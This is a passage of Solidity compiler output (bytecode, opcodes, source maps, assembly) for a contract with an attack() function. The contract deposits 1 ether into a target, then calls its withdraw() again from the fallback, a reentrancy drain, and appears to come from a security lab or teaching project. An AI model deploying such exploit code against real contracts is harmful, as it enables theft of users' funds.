												],
												"src": "845:351:1"
											}
										]
									},
									"contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
							"object": "60806040525f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561006e575f80fd5b506040516103ab3803806103ab83398181016040528101906100909190610133565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061015e565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f610102826100d9565b9050919050565b610112816100f8565b811461011c575f80fd5b50565b5f8151905061012d81610109565b92915050565b5f60208284031215610148576101476100d5565b5b5f6101558482850161011f565b91505092915050565b6102408061016b5f395ff3fe608060405260043610610021575f3560e01c80639e5faafc146100e857610022565b5b670de0b6b3a764000060015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106100e65760015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156100cf575f80fd5b505af11580156100e1573d5f803e3d5ffd5b505050505b005b6100f06100f2565b005b670de0b6b3a7640000341015610106575f80fd5b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b158015610175575f80fd5b505af1158015610187573d5f803e3d5ffd5b505050505060015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156101f2575f80fd5b505af1158015610204573d5f803e3d5ffd5b5050505056fea26469706673582212203ce1937d5845b34d18b73de438ce7138fc4ce89252e8fa6b540fc3218d7973a964736f6c63430008180033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH2 0x6E JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x3AB CODESIZE SUB DUP1 PUSH2 0x3AB DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x90 SWAP2 SWAP1 PUSH2 0x133 JUMP JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x15E JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x102 DUP3 PUSH2 0xD9 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x112 DUP2 PUSH2 0xF8 JUMP JUMPDEST DUP2 EQ PUSH2 0x11C JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x12D DUP2 PUSH2 0x109 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x148 JUMPI PUSH2 0x147 PUSH2 0xD5 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x155 DUP5 DUP3 DUP6 ADD PUSH2 0x11F JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x240 DUP1 PUSH2 0x16B PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x21 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0xE8 JUMPI PUSH2 0x22 JUMP JUMPDEST JUMPDEST PUSH8 0xDE0B6B3A7640000 PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0xE6 JUMPI PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xCF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xE1 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH2 0xF0 PUSH2 0xF2 JUMP JUMPDEST STOP JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x106 JUMPI PUSH0 DUP1 REVERT JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x175 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x187 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1F2 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x204 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 EXTCODECOPY 0xE1 SWAP4 PUSH30 0x5845B34D18B73DE438CE7138FC4CE89252E8FA6B540FC3218D7973A96473 PUSH16 0x6C634300081800330000000000000000 ",
							"sourceMap": "153:442:0:-:0;;;302:12;;;;;;;;;;280:35;;;;;;;;;;;;;;;;;;;;199:77;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;257:13;241:12;;:29;;;;;;;;;;;;;;;;;;199:77;153:442;;88:117:1;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:143::-;753:5;784:6;778:13;769:22;;800:33;827:5;800:33;:::i;:::-;696:143;;;;:::o;845:351::-;915:6;964:2;952:9;943:7;939:23;935:32;932:119;;;970:79;;:::i;:::-;932:119;1090:1;1115:64;1171:7;1162:6;1151:9;1147:22;1115:64;:::i;:::-;1105:74;;1061:128;845:351;;;;:::o;153:442:0:-;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@_67": {
									"entryPoint": null,
									"id": 67,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@attack_49": {
									"entryPoint": 242,
									"id": 49,
									"parameterSlots": 0,
									"returnSlots": 0
								}
							},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405260043610610021575f3560e01c80639e5faafc146100e857610022565b5b670de0b6b3a764000060015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106100e65760015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156100cf575f80fd5b505af11580156100e1573d5f803e3d5ffd5b505050505b005b6100f06100f2565b005b670de0b6b3a7640000341015610106575f80fd5b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b158015610175575f80fd5b505af1158015610187573d5f803e3d5ffd5b505050505060015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156101f2575f80fd5b505af1158015610204573d5f803e3d5ffd5b5050505056fea26469706673582212203ce1937d5845b34d18b73de438ce7138fc4ce89252e8fa6b540fc3218d7973a964736f6c63430008180033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x21 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0xE8 JUMPI PUSH2 0x22 JUMP JUMPDEST JUMPDEST PUSH8 0xDE0B6B3A7640000 PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0xE6 JUMPI PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xCF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xE1 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH2 0xF0 PUSH2 0xF2 JUMP JUMPDEST STOP JUMPDEST PUSH8 0xDE0B6B3A7640000 CALLVALUE LT ISZERO PUSH2 0x106 JUMPI PUSH0 DUP1 REVERT JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x175 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x187 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1F2 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x204 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 EXTCODECOPY 0xE1 SWAP4 PUSH30 0x5845B34D18B73DE438CE7138FC4CE89252E8FA6B540FC3218D7973A96473 PUSH16 0x6C634300081800330000000000000000 ",
							"sourceMap": "153:442:0:-:0;;;;;;;;;;;;;;;;;;;;;540:7;522:5;;;;;;;;;;;514:22;;;:33;510:78;;562:5;;;;;;;;;;;:14;;;:16;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;510:78;153:442;320:144;;;:::i;:::-;;;385:7;372:9;:20;;364:29;;;;;;402:5;;;;;;;;;;;:13;;;423:7;402:31;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;442:5;;;;;;;;;;;:14;;;:16;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;320:144::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "115200",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"": "infinite",
								"attack()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 153,
									"end": 595,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 153,
									"end": 595,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 153,
									"end": 595,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 302,
									"end": 314,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 302,
									"end": 314,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 302,
									"end": 314,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 302,
									"end": 314,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 302,
									"end": 314,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 302,
									"end": 314,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 302,
									"end": 314,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 302,
									"end": 314,
									"name": "DIV",
									"source": 0
								},
								{
									"begin": 302,
									"end": 314,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 302,
									"end": 314,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 280,
									"end": 315,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 280,
									"end": 315,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 280,
									"end": 315,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 280,
									"end": 315,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 280,
									"end": 315,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 280,
									"end": 315,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 280,
									"end": 315,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 280,
									"end": 315,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 280,
									"end": 315,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 280,
									"end": 315,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 280,
									"end": 315,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 280,
									"end": 315,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 280,
									"end": 315,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 280,
									"end": 315,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 280,
									"end": 315,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 280,
									"end": 315,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 280,
									"end": 315,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 280,
									"end": 315,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 280,
									"end": 315,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 280,
									"end": 315,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 199,
									"end": 276,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 199,
									"end": 276,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 199,
									"end": 276,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 199,
									"end": 276,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 199,
									"end": 276,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 199,
									"end": 276,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "3"
								},
								{
									"begin": 199,
									"end": 276,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "tag",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 199,
									"end": 276,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 257,
									"end": 270,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 241,
									"end": 253,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 241,
									"end": 253,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 241,
									"end": 270,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 241,
									"end": 270,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 241,
									"end": 270,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 241,
									"end": 270,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 241,
									"end": 270,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 241,
									"end": 270,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 241,
									"end": 270,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 241,
									"end": 270,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 241,
									"end": 270,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 241,
									"end": 270,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 241,
									"end": 270,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 241,
									"end": 270,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 241,
									"end": 270,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 241,
									"end": 270,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 241,
									"end": 270,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 241,
									"end": 270,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 241,
									"end": 270,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 241,
									"end": 270,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 199,
									"end": 276,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 153,
									"end": 595,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "6"
								},
								{
									"begin": 153,
									"end": 595,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 88,
									"end": 205,
									"name": "tag",
									"source": 1,
									"value": "8"
								},
								{
									"begin": 88,
									"end": 205,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 197,
									"end": 198,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 194,
									"end": 195,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 187,
									"end": 199,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "tag",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 334,
									"end": 460,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 371,
									"end": 378,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 411,
									"end": 453,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 404,
									"end": 409,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 400,
									"end": 454,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 389,
									"end": 454,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 389,
									"end": 454,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "tag",
									"source": 1,
									"value": "11"
								},
								{
									"begin": 466,
									"end": 562,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 503,
									"end": 510,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 532,
									"end": 556,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 550,
									"end": 555,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 532,
									"end": 556,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 532,
									"end": 556,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 532,
									"end": 556,
									"name": "tag",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 532,
									"end": 556,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 521,
									"end": 556,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 521,
									"end": 556,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 568,
									"end": 690,
									"name": "tag",
									"source": 1,
									"value": "12"
								},
								{
									"begin": 568,
									"end": 690,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 641,
									"end": 665,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "22"
								},
								{
									"begin": 659,
									"end": 664,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 641,
									"end": 665,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "11"
								},
								{
									"begin": 641,
									"end": 665,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 641,
									"end": 665,
									"name": "tag",
									"source": 1,
									"value": "22"
								},
								{
									"begin": 641,
									"end": 665,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 634,
									"end": 639,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 631,
									"end": 666,
									"name": "EQ",
									"source": 1
								},
								{
									"begin": 621,
									"end": 684,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "23"
								},
								{
									"begin": 621,
									"end": 684,
									"name": "JUMPI",
